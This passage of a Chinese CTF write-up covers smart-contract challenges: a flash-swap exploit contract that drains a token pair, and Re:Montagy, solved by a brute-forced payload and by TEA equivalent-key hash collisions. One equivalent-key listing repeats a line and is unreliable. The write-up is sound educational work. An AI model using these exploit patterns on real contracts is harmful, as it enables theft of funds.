            chaitinToken = IERC20(_chaitinToken);
            feiToken = IERC20(_feiToken);
            flagToken = IERC20(_flagToken);
            bank = ChaitinBank(_bank);
            pair = IPokePair(_pair);
        }
        // 实现接口
        function ChaitinCall(address sender, uint amount0, uint amount1, bytes calldata data) override external {
            feiToken.transfer(address(pair), 1);
        }
        function attack() public {
            uint256 amount = feiToken.balanceOf(pair);
            uint256 targetAmount = amount / 100 * 99;
            // 利用漏洞获得 99 PDT
            pair.swap(targetAmount, 0, address(this), new bytes(1));
            uint256 receiveAmount = feiToken.balanceOf(address(this));
           feiToken.approve(address(bank), receiveAmount);
            // 将 99PDT 通过 ChaitinBank 兑换成 FlagToken
            bank.depositFeiCointoFlag(receiveAmount);
            // 将 FlagToken 转移到自己的外部账户中
            uint256 flagAmount = flagToken.balanceOf(address(this));
            flagToken.transfer(msg.sender, flagAmount);
        }
    }
## Re:Montagy
Re:Montagy 是去年题目 Montagy 的 revenge 版本，用于复现的合约地址
Ropsten@0x4058c4b40A02977Cb1626f7dCd100438d2CC4E51
## 源码
    pragma solidity ^0.5.11;
    contract Montagy{
        address payable public owner;
        mapping(bytes32=>uint256) registeredIDLength;
        mapping(address=>bytes32) puzzleID;
        address public lastchildaddr;
        string public winnerinfo;
        constructor() public payable{
            owner = msg.sender;
        }
        modifier onlyOwner(){
            require(msg.sender == owner);
            _;
        }
        modifier onlyPuzzle(){
            require(puzzleID[msg.sender] != 0);
            _;
        }
        function registerCode(bytes memory a) public onlyOwner {
            registeredIDLength[tag(a)] = a.length;
        }
        function newPuzzle(bytes memory code) public returns(address addr){
            bytes32 id = tag(code);
            require(registeredIDLength[id] == code.length);
            addr = deploy(code);
            lastchildaddr = addr;
            puzzleID[addr] = id;
        }
        function solve(string memory info) public onlyPuzzle {
            owner.transfer(address(this).balance);
            winnerinfo = info;
        }
        function deploy(bytes memory code) private returns(address addr){
            assembly {
                addr := create(0,add(code,0x20), mload(code))
                if eq(extcodesize(addr), 0) { revert(0, 0) }
            }
        }
        function tag(bytes memory a) pure public returns(bytes32 cs){
            assembly{
                let groupsize := 16
                let head := add(a,groupsize)
                let tail := add(head, mload(a))
                let t1 := 0x21711730
                let t2 := 0x7312f103
                let m1,m2,m3,m4,p1,p2,p3,s,tmp
                for { let i := head } lt(i, tail) { i := add(i, groupsize) } {
                    s := 0x6644498b
                    tmp := mload(i)
                    m1 := and(tmp,0xffffffff)
                    m2 := and(shr(0x20,tmp),0xffffffff)
                    m3 := and(shr(0x40,tmp),0xffffffff)
                    m4 := and(shr(0x60,tmp),0xffffffff)
                    for { let j := 0 } lt(j, 0x10) { j := add(j, 1) } {
                        s := and(add(s, 0x68696e74),0xffffffff)
                        p1 := sub(mul(t1, 0x10), m1)
                        p2 := add(t1, s)
                        p3 := add(div(t1,0x20), m2)
                        t2 := and(add(t2, xor(p1,xor(p2,p3))), 0xffffffff)
                        p1 := add(mul(t2, 0x10), m3)
                        p2 := add(t2, s)
                        p3 := sub(div(t2,0x20), m4)
                        t1 := and(add(t1, xor(p1,xor(p2,p3))), 0xffffffff)
                    }
                }
                cs := xor(mul(t1,0x100000000),t2)
            }
        }
    }
可以看到题目本身的考点非常明确：我们最终的目的是调用 `solve(string memory info)`，但由于修饰符 `onlyPuzzle`
的限制，只能通过由 `newPuzzle(bytes memory code)` 部署的合约来调用该方法。而能通过 `newPuzzle()`
部署的合约，其对应的哈希必须先由 `registerCode(bytes memory a)` 注册，所以我们的目的就变成了，构造出一个能调用
`solve()` 函数的合约，且该合约通过 `tag()` 函数计算的哈希和出题人注册过的哈希相同。
本题跟去年的 Montagy 比主要有两点变化：
  1. `require(registeredIDLength[id] == code.length)`，所以要求我们部署合约的 bytecode 长度需要和原长度一样
  2. `for { let j := 0 } lt(j, 0x10) { j := add(j, 1) }` 轮次迭代到 16 次，所以无法像去年一样使用 z3 进行求解
###  非预期解（爆破）
简单说，就是我们构造一个直接调用的合约然后通过枚举的方式来尝试出可能的 padding，使得我们 padding
过后的字节码的哈希和出题人部署合约的哈希一致。关于爆破方法可以参考 pikachu 师傅写的 wp：[第三届realworld
区块链wp](https://hitcxy.com/2021/rw2021/)，非常巧妙地用了从两个方向同时枚举的方法来爆破哈希，这里只贴一下我用该方法编写的
poc 和最终的 payload:
    pragma solidity ^0.5.10;
    contract Montagy{
        function solve(string memory info) public;
    }
    contract Solve{
        Montagy public server;
        constructor() public{
            server = Montagy(0x4058c4b40A02977Cb1626f7dCd100438d2CC4E51);
        }
        function solve() public {
            server.solve("syang solve");
        }
    }
    // pyaload bytecode
    0x608060405234801561001057600080fd5b50734058c4b40a02977cb1626f7dcd100438d2cc4e516000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101d6806100746000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806341c0e1b514610046578063890d690814610050578063fd922a421461005a575b600080fd5b61004e6100a4565b005b6100586100bd565b005b61006261017c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166376fe1e926040518163ffffffff1660e01b815260040180806020018281038252600b8152602001807f7379616e6720736f6c7665000000000000000000000000000000000000000000815250602001915050600060405180830381600087803b15801561016257600080fd5b505af1158015610176573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea265627a7a72305820b2655431011fa078095ed57c4d53d917761ecbc527ff660e30c138121a6b421d64736f6c634300050ad697cf90000000000000000000000001c956f070000000800000000000000000032
###  预期解
本题用魔改的 TEA 算法作为散列函数来计算哈希，预期解应该是 TEA 算法的等效密钥问题：
>
> 值得注意的是，TEA算法中的密钥中存在缺陷。每一个key都等效于其他算法中的三个key，这意味着实际上key中只有126bit会生效。因此，TEA算法的散列性能不好。这个弱点甚至导致了Xbox被黑客攻击。
根据[相关资料](https://www.tayloredge.com/reference/Mathematics/VRAndem.pdf)的介绍，对于任意一个
TEA 算法的任意一个 128bit 密钥 `K = (K[0], K[1], K[2], K[3])`，存在以下三个密钥同它等效：
    (K[0]+0x80000000, K[1]+0x80000000, K[2], K[3])
    (K[0]+0x80000000, K[1]+0x80000000, K[2]+0x80000000, K[3]+0x80000000)
    (K[0]+0x80000000, K[1]+0x80000000, K[2]+0x80000000, K[3]+0x80000000)
举个例子，对于密钥 `00000000000000000000000000000000`，等效密钥有:
    80000000800000000000000000000000
    00000000000000008000000080000000
    80000000800000008000000080000000
而应用到本题中，则是这些等效密钥经过散列函数后的结果都是相同的：
    tag(0x00000000000000000000000000000000) == 0x2c5f3e1643c34d6e
    tag(0x80000000800000000000000000000000) == 0x2c5f3e1643c34d6e
    tag(0x00000000000000008000000080000000) == 0x2c5f3e1643c34d6e
    tag(0x80000000800000008000000080000000) == 0x2c5f3e1643c34d6e
这也就意味这我们能改动合约的几个特定 bit，而不会对合约的哈希计算造成任何的影响。这里我们可以写一个小脚本来查看有哪些 bit 是我们可以改动的：
    def print_key(a):
        if len(a) % 32 != 0:
            a += '0'*(32 - len(a) % 32)
        for i in range(0, len(a), 32):
            tmp = int(a[i:i+32], 16)
            m1 = tmp & 0xffffffff
            m2 = (tmp >> 0x20) & 0xffffffff
            m3 = (tmp >> 0x40) & 0xffffffff
            m4 = (tmp >> 0x60) & 0xffffffff
            print(hex(m4)[2::].zfill(8), hex(m3)[2::].zfill(8), hex(m2)[2::].zfill(8), hex(m1)[2::].zfill(8))
下面继续来看 `Puzzle` 合约，很明显需要改动的是 `keccak256(seed) ==
bytes32(bytes18(0x6111d850336107ef16565b908018915a9056))` 这个条件，因为在目前的条件下，爆破
keccak256 的哈希是一件几乎不可能的事情。
    contract Puzzle{
        Montagy public server;
        constructor() public{
            server = Montagy(msg.sender);
        }
        uint256 a;
        uint256 b;